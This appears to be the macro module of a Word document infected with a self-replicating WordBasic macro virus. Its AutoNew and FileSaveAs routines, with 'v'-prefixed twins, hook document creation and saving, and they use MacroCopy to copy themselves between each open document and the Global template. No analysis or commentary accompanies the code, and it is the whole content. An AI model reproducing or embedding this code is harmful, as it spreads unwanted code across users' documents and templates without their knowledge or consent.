   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "vFileSaveAs"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.vFileSaveAs.MAIN"
   Dim Source$
   Dim Target$
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg
       Source$ = "Global:"
       Target$ = WordBasic.[WindowName$]() + ":"
       WordBasic.MacroCopy Source$ + "vAutoNew", Target$ + "AutoNew"
       WordBasic.MacroCopy Source$ + "AutoNew", Target$ + "vAutoNew"
       WordBasic.MacroCopy Source$ + "vFileSaveAs", Target$ + "FileSaveAs"
       WordBasic.MacroCopy Source$ + "FileSaveAs", Target$ + "vFileSaveAs"
   dlg.Format = 1
   WordBasic.FileSaveAs dlg
   End Sub

   Attribute VB_Name = "FileSaveAs"

   Public Sub MAIN()
   Dim Target$
   Dim Source$
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg
       Target$ = "Global:"
       Source$ = WordBasic.[WindowName$]() + ":"
       WordBasic.MacroCopy Source$ + "vAutoNew", Target$ + "AutoNew"
       WordBasic.MacroCopy Source$ + "AutoNew", Target$ + "vAutoNew"
       WordBasic.MacroCopy Source$ + "vFileSaveAs", Target$ + "FileSaveAs"
       WordBasic.MacroCopy Source$ + "FileSaveAs", Target$ + "vFileSaveAs"
   dlg.Format = 1
   WordBasic.FileSaveAs dlg
   End Sub

   Attribute VB_Name = "vAutoNew"

   Public Sub MAIN()
   Dim Source$
   Dim Target$
       Source$ = "Global:"
       Target$ = WordBasic.[WindowName$]() + ":"
       WordBasic.MacroCopy Source$ + "vAutoNew", Target$ + "AutoNew"
       WordBasic.MacroCopy Source$ + "AutoNew", Target$ + "vAutoNew"
       WordBasic.MacroCopy Source$ + "vFileSaveAs", Target$ + "FileSaveAs"
       WordBasic.MacroCopy Source$ + "FileSaveAs", Target$ + "vFileSaveAs"
   End Sub

   Attribute VB_Name = "AutoNew"

   Public Sub MAIN()
   Dim Target$
   Dim Source$
       Target$ = "Global:"
       Source$ = WordBasic.[WindowName$]() + ":"
       WordBasic.MacroCopy Source$ + "vAutoNew", Target$ + "AutoNew"
       WordBasic.MacroCopy Source$ + "AutoNew", Target$ + "vAutoNew"
       WordBasic.MacroCopy Source$ + "vFileSaveAs", Target$ + "FileSaveAs"
       WordBasic.MacroCopy Source$ + "FileSaveAs", Target$ + "vFileSaveAs"
   End Sub
